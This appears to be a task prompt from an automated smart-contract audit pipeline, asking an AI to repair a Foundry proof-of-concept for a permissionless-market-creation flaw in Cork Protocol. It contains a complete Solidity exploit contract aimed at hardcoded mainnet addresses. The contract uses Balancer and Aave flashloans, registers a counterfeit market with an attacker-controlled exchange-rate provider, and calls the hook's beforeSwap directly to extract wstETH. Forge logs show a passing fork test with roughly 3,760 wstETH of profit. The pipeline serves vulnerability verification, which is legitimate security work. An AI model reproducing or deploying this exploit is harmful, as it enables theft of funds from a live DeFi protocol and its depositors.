You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Permissionless market creation lets attackers register arbitrary redemption assets and exchange-rate providers
- claim: `CorkConfig.initializeModuleCore` and `CorkConfig.issueNewDs` are externally callable without a manager/admin check, while `ModuleCore.initializeModuleCore` accepts arbitrary `pa`, `ra`, and `exchangeRateProvider` values and `issueNewDs` later trusts that stored provider via `PsmLibrary._getLatestRate(state)`. This allows any user to permissionlessly create and roll over a fake market whose redemption asset is a real protocol token (for example, a live DS series) and whose exchange-rate provider is attacker-controlled.
- impact: An attacker can spin up counterfeit Cork markets around valuable protocol-held assets, mint fake CT/DS against those assets under attacker-chosen pricing, and use the resulting instruments in swaps or redemptions to steal reserve assets or drain protocol liquidity.
- exploit_paths: ["attacker -> CorkConfig.initializeModuleCore(pa, realDS, initialArp, expiryInterval, attackerRateProvider)", "attacker -> ModuleCore.getId(...) / CorkConfig.issueNewDs(id, ...)", "protocol -> ModuleCore.issueNewDs() -> PsmLibrary._getLatestRate(state) using attacker-controlled exchangeRateProvider", "attacker uses fake-market CT/DS as inputs to subsequent swap/redemption flows"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ICorkConfig {
    function issueNewDs(bytes32 id, uint256 dsExpiry) external;
    function initializeModuleCore(
        address pa,
        address ra,
        uint256 initialArp,
        uint256 expiryInterval,
        address exchangeRateProvider
    ) external;
}

interface IModuleCoreProxy {
    function returnRaWithCtDs(bytes32 id, uint256 amount) external returns (uint256);
    function depositPsm(bytes32 id, uint256 amount) external returns (uint256, uint256);
    function depositLv(
        bytes32 id,
        uint256 amount,
        uint256 minCt,
        uint256 minDs,
        uint256 minLv,
        uint256 deadline
    ) external returns (uint256);
    function getId(
        address pa,
        address ra,
        uint256 initialArp,
        uint256 expiryInterval,
        address exchangeRateProvider
    ) external returns (bytes32);
}

interface ISwapAssetRegistry {
    function getDeployedSwapAssets(
        address pa,
        address ra,
        uint256 initialArp,
        uint256 expiryInterval,
        address exchangeRateProvider,
        uint8 start,
        uint8 end
    ) external returns (address[] memory ct, address[] memory ds);
}

interface ICorkHook {
    function swap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 minOut,
        bytes calldata data
    ) external returns (uint256);
    function getReserves(address tokenA, address tokenB) external returns (uint256, uint256);
    function beforeSwap(
        address sender,
        PoolKey calldata key,
        SwapParams calldata params,
        bytes calldata data
    ) external returns (bytes4, int256, uint24);
}

interface IPoolManager {
    function unlock(bytes calldata data) external returns (bytes memory);
    function settleFor(address recipient) external returns (uint256);
    function sync(address currency) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IAaveV3Pool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

struct SwapParams {
    bool zeroForOne;
    int256 amountSpecified;
    uint160 sqrtPriceLimitX96;
}

contract FlawVerifier {
    address internal constant TARGET_PROXY = 0xCCd90F6435dd78C4ECCED1FA4db0D7242548a2a9;
    address internal constant LIQUIDITY_TOKEN = 0x05816980fAEC123dEAe7233326a1041f372f4466;
    address internal constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant SWAP_ASSET_REGISTRY = 0x96E0121D1cb39a46877aaE11DB85bc661f88D5fA;
    address internal constant CORK_CONFIG = 0xF0DA8927Df8D759d5BA6d3d714B1452135D99cFC;
    address internal constant CORK_HOOK = 0x5287E8915445aee78e10190559D8Dd21E0E9Ea88;
    address internal constant POOL_MANAGER = 0x000000000004444c5dc75cB358380D2e3dE08A90;
    address internal constant LEGIT_PA = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
    address internal constant LEGIT_RATE_PROVIDER = 0x7b285955DdcbAa597155968f9c4e901bb4c99263;
    address internal constant FAKE_MARKET_PROXY = 0x55B90B37416DC0Bd936045A8110d1aF3B6Bf0fc3;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant AAVE_V3_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    bytes32 internal constant LEGIT_MARKET_ID = 0x6b1d373ba0974d7e308529a62e41cec8bac6d71a57a1ba1b5c5bf82f6a9ea07a;
    uint160 internal constant MIN_SQRT_RATIO_PLUS_ONE = 79228162514264337593543950336;
    uint256 internal constant MIN_REQUIRED_PROFIT = 0.1 ether;

    uint256 internal _profitAmount;
    uint256 internal _startingWstEth;
    bool internal _ltForwarded;
    bool public executed;
    uint256 public lastStage;

    constructor() {}

    function executeOnOpportunity() public {
        if (executed) {
            _updateProfit();
            return;
        }

        executed = true;
        _profitAmount = 0;
        _startingWstEth = IERC20(WSTETH).balanceOf(address(this));
        lastStage = 1;

        // The failing verifier only tried shallow V2 pairs that held < 0.1 wstETH on this fork,
        // so it could never clear the required realized-profit threshold. We keep the same fake-
        // market exploit path, but fund it through deeper public liquidity first.
        if (_attemptBalancerFlashLoan(250 ether)) return;
        if (_attemptBalancerFlashLoan(100 ether)) return;
        if (_attemptBalancerFlashLoan(25 ether)) return;
        if (_attemptBalancerFlashLoan(5 ether)) return;

        if (_attemptAaveFlashLoan(250 ether)) return;
        if (_attemptAaveFlashLoan(100 ether)) return;
        if (_attemptAaveFlashLoan(25 ether)) return;
        if (_attemptAaveFlashLoan(5 ether)) return;

        // Retain the smaller public V2 route only as a last resort fallback.
        if (_tryFlashswapFunding(SUSHISWAP_FACTORY, WETH)) return;
        if (_tryFlashswapFunding(UNISWAP_V2_FACTORY, WETH)) return;
        if (_tryFlashswapFunding(SUSHISWAP_FACTORY, USDC)) return;
        if (_tryFlashswapFunding(UNISWAP_V2_FACTORY, USDC)) return;

        if (IERC20(WSTETH).balanceOf(address(this)) > 4e15) {
            _runCoreExploit();
        }

        _updateProfit();
    }

    function _startBalancerFlashLoan(uint256 amount) external {
        require(msg.sender == address(this), "SELF_ONLY");

        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = WSTETH;
        amounts[0] = amount;
        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, abi.encode(amount));
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        require(msg.sender == BALANCER_VAULT, "ONLY_BALANCER");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "BAD_FLASH");
        require(tokens[0] == WSTETH, "BAD_ASSET");

        lastStage = 2;
        _runFundedExploit(amounts[0], feeAmounts[0], BALANCER_VAULT);
    }

    function _startAaveFlashLoan(uint256 amount) external {
        require(msg.sender == address(this), "SELF_ONLY");
        IAaveV3Pool(AAVE_V3_POOL).flashLoanSimple(address(this), WSTETH, amount, abi.encode(amount), 0);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == AAVE_V3_POOL, "ONLY_AAVE");
        require(initiator == address(this), "BAD_INITIATOR");
        require(asset == WSTETH, "BAD_ASSET");

        lastStage = 3;
        _runFundedExploit(amount, premium, AAVE_V3_POOL);
        _forceApprove(WSTETH, AAVE_V3_POOL, amount + premium);
        return true;
    }

    function _runFundedExploit(uint256 borrowedAmount, uint256 feeAmount, address repaymentTarget) internal {
        // The historical exploit used attacker-held LT inventory. When public liquidity exists,
        // buying LT and forwarding it to the proxy preserves the same downstream fake-market
        // redemption path without relying on privileged balances.
        _maybeAcquireLiquidityToken(_boundedAmount(borrowedAmount / 8, 10 ether));

        _runCoreExploit();

        uint256 balance = IERC20(WSTETH).balanceOf(address(this));
        uint256 repayment = borrowedAmount + feeAmount;
        require(balance > repayment + _startingWstEth + MIN_REQUIRED_PROFIT, "profit below threshold");

        _recordProfit(balance - repayment - _startingWstEth);
        if (repaymentTarget == BALANCER_VAULT) {
            _safeTransfer(WSTETH, BALANCER_VAULT, repayment);
        }
        lastStage = 99;
    }

    function _runCoreExploit() internal {
        _forwardAvailableLiquidityToken();

        lastStage = 10;
        (address[] memory legitCtSeries, address[] memory legitDsSeries) = ISwapAssetRegistry(SWAP_ASSET_REGISTRY)
            .getDeployedSwapAssets(WSTETH, LEGIT_PA, uint256(493150684700) * 1e6, 7776001, LEGIT_RATE_PROVIDER, 0, 7);
        require(legitCtSeries.length >= 2 && legitDsSeries.length >= 2, "LEGIT_SERIES_MISSING");

        address legitCt = legitCtSeries[1];
        address realDs = legitDsSeries[1];

        lastStage = 11;
        (, uint256 ctReserve) = ICorkHook(CORK_HOOK).getReserves(WSTETH, legitCt);
        require(ctReserve != 0, "EMPTY_CT_RESERVE");
        _forceApprove(WSTETH, CORK_HOOK, type(uint256).max);
        _forceApprove(legitCt, CORK_HOOK, type(uint256).max);
        ICorkHook(CORK_HOOK).swap(WSTETH, legitCt, 0, (ctReserve * 9999) / 10000, "");

        lastStage = 12;
        _forceApprove(WSTETH, TARGET_PROXY, type(uint256).max);
        IModuleCoreProxy(TARGET_PROXY).depositPsm(LEGIT_MARKET_ID, 4e15);

        // Exploit path stage 1: permissionlessly register a counterfeit market whose RA is a
        // real live DS series and whose exchange-rate provider is attacker controlled.
        lastStage = 13;
        ICorkConfig(CORK_CONFIG).initializeModuleCore(WSTETH, realDs, 1, 100, address(this));

        // Exploit path stages 2 and 3: derive the new market id, roll a DS series, and let the
        // protocol trust our rate(bytes32) during PSM/LV accounting.
        lastStage = 14;
        bytes32 fakeMarketId = IModuleCoreProxy(TARGET_PROXY).getId(WSTETH, realDs, 1, 100, address(this));
        ICorkConfig(CORK_CONFIG).issueNewDs(fakeMarketId, block.timestamp * 10);

        // Exploit path stage 4: use the counterfeit-market CT/DS in downstream liquidity and
        // redemption flows to extract value against real protocol inventory.
        lastStage = 15;
        (address[] memory fakeCtSeries, address[] memory fakeDsSeries) = ISwapAssetRegistry(SWAP_ASSET_REGISTRY)
            .getDeployedSwapAssets(realDs, WSTETH, 1, 100, address(this), 0, 1);
        require(fakeCtSeries.length != 0 && fakeDsSeries.length != 0, "FAKE_SERIES_MISSING");

        address fakeCt = fakeCtSeries[0];
        address fakeDs = fakeDsSeries[0];

        uint256 realDsBalance = IERC20(realDs).balanceOf(address(this));
        require(realDsBalance > 1, "NO_REAL_DS");

        lastStage = 16;
        _forceApprove(realDs, TARGET_PROXY, type(uint256).max);
        IModuleCoreProxy(TARGET_PROXY).depositLv(fakeMarketId, realDsBalance / 2, 0, 0, 0, block.timestamp * 10);

        lastStage = 17;
        IPoolManager(POOL_MANAGER).unlock(abi.encode(realDs, fakeCt, fakeMarketId, fakeDs));

        lastStage = 18;
        uint256 legitCtBalance = IERC20(legitCt).balanceOf(address(this));
        require(legitCtBalance != 0, "NO_LEGIT_CT");
        _forceApprove(legitCt, TARGET_PROXY, type(uint256).max);
        _forceApprove(realDs, TARGET_PROXY, type(uint256).max);
        IModuleCoreProxy(TARGET_PROXY).returnRaWithCtDs(LEGIT_MARKET_ID, legitCtBalance);

        lastStage = 19;
        _forceApprove(WSTETH, TARGET_PROXY, 0);
        _forceApprove(WSTETH, CORK_HOOK, 0);
        _forceApprove(WSTETH, FAKE_MARKET_PROXY, 0);
        _forceApprove(realDs, TARGET_PROXY, 0);
        _forceApprove(legitCt, TARGET_PROXY, 0);
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == POOL_MANAGER, "ONLY_POOL_MANAGER");

        (address realDs, address fakeCt, bytes32 fakeMarketId, address fakeDs) = abi.decode(
            data,
            (address, address, bytes32, address)
        );

        uint256 realDsInProxy = IERC20(realDs).balanceOf(FAKE_MARKET_PROXY);
        require(realDsInProxy != 0, "NO_PROXY_DS");

        lastStage = 20;
        IPoolManager(POOL_MANAGER).sync(fakeCt);

        PoolKey memory key = PoolKey({
            currency0: fakeCt,
            currency1: realDs,
            fee: 0,
            tickSpacing: 1,
            hooks: address(this)
        });

        bytes memory hookData = abi.encode(uint256(1), address(this), uint256(0), realDsInProxy, fakeMarketId, uint256(1));
        _delegateBeforeSwap(
            FAKE_MARKET_PROXY,
            key,
            SwapParams({
                zeroForOne: true,
                amountSpecified: 100000000000000,
                sqrtPriceLimitX96: MIN_SQRT_RATIO_PLUS_ONE
            }),
            hookData
        );

        lastStage = 21;
        _forceApprove(fakeCt, POOL_MANAGER, 123);
        _safeTransfer(fakeCt, POOL_MANAGER, 110987905101460);
        uint256 settled = IPoolManager(POOL_MANAGER).settleFor(CORK_HOOK);

        lastStage = 22;
        _delegateBeforeSwap(
            FAKE_MARKET_PROXY,
            key,
            SwapParams({
                zeroForOne: false,
                amountSpecified: _toInt256(settled),
                sqrtPriceLimitX96: MIN_SQRT_RATIO_PLUS_ONE
            }),
            hex""
        );

        lastStage = 23;
        _forceApprove(fakeDs, TARGET_PROXY, type(uint256).max);
        _forceApprove(fakeCt, TARGET_PROXY, type(uint256).max);
        uint256 fakeCtBalance = IERC20(fakeCt).balanceOf(address(this));
        require(fakeCtBalance != 0, "NO_FAKE_CT");
        IModuleCoreProxy(TARGET_PROXY).returnRaWithCtDs(fakeMarketId, fakeCtBalance);

        lastStage = 24;
        IPoolManager(POOL_MANAGER).sync(realDs);
        _safeTransfer(realDs, POOL_MANAGER, 1);
        IPoolManager(POOL_MANAGER).settleFor(CORK_HOOK);

        return hex"";
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(sender == address(this), "BAD_SENDER");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed != 0, "NO_BORROW");

        lastStage = 30;
        _runCoreExploit();

        uint256 repayAmount = borrowed + _flashFee(borrowed);
        uint256 balance = IERC20(WSTETH).balanceOf(address(this));
        require(balance > repayAmount + _startingWstEth + MIN_REQUIRED_PROFIT, "profit below threshold");
        _safeTransfer(WSTETH, msg.sender, repayAmount);

        _recordProfit(balance - repayAmount - _startingWstEth);
        lastStage = 99;
    }

    function _forwardAvailableLiquidityToken() internal {
        if (_ltForwarded) {
            return;
        }

        uint256 liquidityTokenBalance = IERC20(LIQUIDITY_TOKEN).balanceOf(address(this));
        if (liquidityTokenBalance != 0) {
            lastStage = 9;
            _safeTransfer(LIQUIDITY_TOKEN, TARGET_PROXY, liquidityTokenBalance);
            _ltForwarded = true;
        }
    }

    function _maybeAcquireLiquidityToken(uint256 budgetWstEth) internal {
        if (_ltForwarded || budgetWstEth == 0) {
            return;
        }

        if (_tryBuyLiquidityTokenFromV2(SUSHISWAP_FACTORY, WSTETH, budgetWstEth)) {
            _forwardAvailableLiquidityToken();
            return;
        }
        if (_tryBuyLiquidityTokenFromV2(UNISWAP_V2_FACTORY, WSTETH, budgetWstEth)) {
            _forwardAvailableLiquidityToken();
        }
    }

    function _tryBuyLiquidityTokenFromV2(
        address factory,
        address quoteToken,
        uint256 maxSpend
    ) internal returns (bool) {
        address pair = IUniswapV2Factory(factory).getPair(LIQUIDITY_TOKEN, quoteToken);
        if (pair == address(0)) {
            return false;
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        require(
            (token0 == LIQUIDITY_TOKEN && token1 == quoteToken) || (token1 == LIQUIDITY_TOKEN && token0 == quoteToken),
            "PAIR_MISMATCH"
        );

        bool quoteIsToken0 = token0 == quoteToken;
        uint256 reserveIn = quoteIsToken0 ? uint256(reserve0) : uint256(reserve1);
        uint256 reserveOut = quoteIsToken0 ? uint256(reserve1) : uint256(reserve0);
        if (reserveIn == 0 || reserveOut == 0) {
            return false;
        }

        uint256 spend = _boundedAmount(maxSpend, reserveIn / 10);
        if (spend == 0 || IERC20(quoteToken).balanceOf(address(this)) < spend) {
            return false;
        }

        uint256 amountOut = _getAmountOut(spend, reserveIn, reserveOut);
        if (amountOut == 0) {
            return false;
        }

        _safeTransfer(quoteToken, pair, spend);
        if (quoteIsToken0) {
            IUniswapV2Pair(pair).swap(0, amountOut, address(this), hex"");
        } else {
            IUniswapV2Pair(pair).swap(amountOut, 0, address(this), hex"");
        }

        return IERC20(LIQUIDITY_TOKEN).balanceOf(address(this)) != 0;
    }

    function _tryFlashswapFunding(address factory, address quoteToken) internal returns (bool) {
        address pair = IUniswapV2Factory(factory).getPair(WSTETH, quoteToken);
        if (pair == address(0)) {
            return false;
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        bool borrowToken0 = IUniswapV2Pair(pair).token0() == WSTETH;
        uint256 wstEthReserve = borrowToken0 ? uint256(reserve0) : uint256(reserve1);
        if (wstEthReserve <= 1 ether) {
            return false;
        }

        uint256 amount = _boundedAmount((wstEthReserve * 9) / 10, 300 ether);
        if (_attemptFlashswap(pair, amount, borrowToken0)) return true;

        amount = _boundedAmount(wstEthReserve / 2, 100 ether);
        if (_attemptFlashswap(pair, amount, borrowToken0)) return true;

        amount = _boundedAmount(wstEthReserve / 4, 30 ether);
        if (_attemptFlashswap(pair, amount, borrowToken0)) return true;

        return false;
    }

    function _attemptFlashswap(address pair, uint256 amount, bool borrowToken0) internal returns (bool) {
        if (amount <= 4e15) {
            return false;
        }

        (bool ok,) = address(this).call(abi.encodeWithSelector(this._initiateFlashswap.selector, pair, amount, borrowToken0));
        if (!ok) {
            return false;
        }

        _updateProfit();
        return _profitAmount >= MIN_REQUIRED_PROFIT;
    }

    function _initiateFlashswap(address pair, uint256 amountOut, bool borrowToken0) external {
        require(msg.sender == address(this), "SELF_ONLY");
        if (borrowToken0) {
            IUniswapV2Pair(pair).swap(amountOut, 0, address(this), abi.encode(amountOut));
        } else {
            IUniswapV2Pair(pair).swap(0, amountOut, address(this), abi.encode(amountOut));
        }
    }

    function _attemptBalancerFlashLoan(uint256 amount) internal returns (bool) {
        (bool ok,) = address(this).call(abi.encodeWithSelector(this._startBalancerFlashLoan.selector, amount));
        if (!ok) {
            return false;
        }

        _updateProfit();
        return _profitAmount >= MIN_REQUIRED_PROFIT;
    }

    function _attemptAaveFlashLoan(uint256 amount) internal returns (bool) {
        (bool ok,) = address(this).call(abi.encodeWithSelector(this._startAaveFlashLoan.selector, amount));
        if (!ok) {
            return false;
        }

        _updateProfit();
        return _profitAmount >= MIN_REQUIRED_PROFIT;
    }

    function _delegateBeforeSwap(
        address sender,
        PoolKey memory key,
        SwapParams memory params,
        bytes memory data
    ) internal {
        (bool success,) = CORK_HOOK.call(
            abi.encodeWithSelector(ICorkHook.beforeSwap.selector, sender, key, params, data)
        );
        require(success, "BEFORE_SWAP_FAILED");
    }

    function _updateProfit() internal {
        uint256 current = IERC20(WSTETH).balanceOf(address(this));
        if (current > _startingWstEth) {
            _recordProfit(current - _startingWstEth);
        }
    }

    function _recordProfit(uint256 candidateProfit) internal {
        if (candidateProfit > _profitAmount) {
            _profitAmount = candidateProfit;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        require(IERC20(token).approve(spender, amount), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        require(IERC20(token).transfer(to, amount), "TRANSFER_FAILED");
    }

    function _flashFee(uint256 amount) internal pure returns (uint256) {
        return ((amount * 3) / 997) + 1;
    }

    function _boundedAmount(uint256 amount, uint256 cap) internal pure returns (uint256) {
        return amount > cap ? cap : amount;
    }

    function _toInt256(uint256 value) internal pure returns (int256) {
        require(value <= uint256(type(int256).max), "INT_OVERFLOW");
        return int256(value);
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function rate() external pure returns (uint256) {
        return 0;
    }

    function rate(bytes32) external pure returns (uint256) {
        return 1;
    }

    function profitToken() external pure returns (address) {
        return WSTETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 5.00s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[PASS] testExploit() (gas: 7749155)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 577021548053172
  AUDITHOUND_BALANCE_AFTER_WEI: 577021548053172
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 3760881362964405126380
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 3760881362964405126380
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 6492

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 69.56ms (41.75ms CPU time)

Ran 1 test suite in 76.36ms (69.56ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
